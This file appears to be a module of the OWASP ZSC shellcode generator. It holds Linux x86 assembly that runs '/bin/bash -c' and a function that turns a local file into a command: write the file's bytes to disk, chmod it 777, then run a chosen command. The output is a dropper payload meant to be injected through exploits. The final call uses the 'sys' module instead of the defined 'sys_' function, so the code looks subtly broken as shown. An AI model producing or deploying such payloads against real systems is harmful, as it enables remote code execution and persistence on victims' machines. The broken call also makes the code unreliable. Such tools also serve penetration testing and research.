#!/usr/bin/env python
'''
OWASP ZSC | ZCR Shellcoder
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/Ali-Razmjoo/OWASP-ZSC
http://api.z3r0d4y.com/
https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool-project[at]lists[dot]owasp[dot]org ]

shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
'''
import sys
import binascii
from core import color
from core import stack
from lib.opcoder.linux_x86 import convert
def sys_(command):
	return '''push   $0xb
pop    %%eax
cltd
push   %%edx
%s
mov    %%esp,%%esi
push   %%edx
push   $0x632d9090
pop    %%ecx
shr    $0x10,%%ecx
push   %%ecx
mov    %%esp,%%ecx
push   %%edx
push   $0x68
push   $0x7361622f
push   $0x6e69622f
mov    %%esp,%%ebx
push   %%edx
push   %%edi
push   %%esi
push   %%ecx
push   %%ebx
mov    %%esp,%%ecx
int    $0x80
'''%(str(command))
def run(data):
	filename,content,command = data[0],data[1],data[2]
	command = command.replace('[space]',' ')
	try:
		cont = binascii.b2a_hex(open(content).read())
	except:
		from core import start
		sys.exit(color.color('red')+'Error, Cannot find/open the file %s'%(content)+color.color('reset'))
	l = len(cont) -1
	n = 0
	c = '\\x'
	for word in cont:
		c += word
		n+=1
		if n is 2:
			n = 0
			c += '\\x'
	c = c[:-2]
	command = 'echo -e "%s" > %s ; chmod 777 %s ; %s'%(str(c),str(filename),str(filename),str(command))
	return sys(stack.generate(command.replace('[space]',' '),'%ecx','string'))